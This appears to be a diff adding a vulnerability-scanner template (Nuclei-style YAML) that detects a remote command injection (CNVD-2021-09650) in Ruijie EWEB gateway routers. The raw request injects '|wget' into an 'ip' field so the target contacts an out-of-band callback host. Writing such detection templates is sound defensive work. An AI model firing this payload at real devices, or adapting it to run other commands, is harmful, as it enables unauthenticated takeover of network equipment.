@@ -1,0 +1,41 @@
+id: CNVD-2021-09650
+info:
+  name: Ruijie EWEB Gateway Platform - Remote Command Injection
+  author:
+  - l0ne1y
+  tags:
+  - ruijie
+  - cnvd
+  - cnvd2021
+  - rce
+  description: |-
+    锐捷网络股份有限公司NBR路由器EWEB网管系统存在命令执行漏洞
+    锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。
+
+    锐捷网络股份有限公司NBR路由器EWEB网管系统存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权限。
+  reference:
+  - http://j0j0xsec.top/2021/04/22/%e9%94%90%e6%8d%b7eweb%e7%bd%91%e5%85%b3%e5%b9%b3%e5%8f%b0%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/
+  severity: critical
+  classification:
+    cwe-id:
+    - cwe-77
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+  remediation: |-
+    官方修复方案：
+    1.厂商已发布了漏洞修复程序，请及时关注更新：
+    https://www.ruijie.com.cn/gy/xw-aqtg-gw/86747/
+requests:
+- matchers:
+  - type: word
+    part: interactsh_protocol
+    name: http
+    words:
+    - http
+  raw:
+  - |
+    POST /guest_auth/guestIsUp.php
+    Host: {{Hostname}}
+
+    mac=1&ip=127.0.0.1|wget {{interactsh-url}}
+  unsafe: true
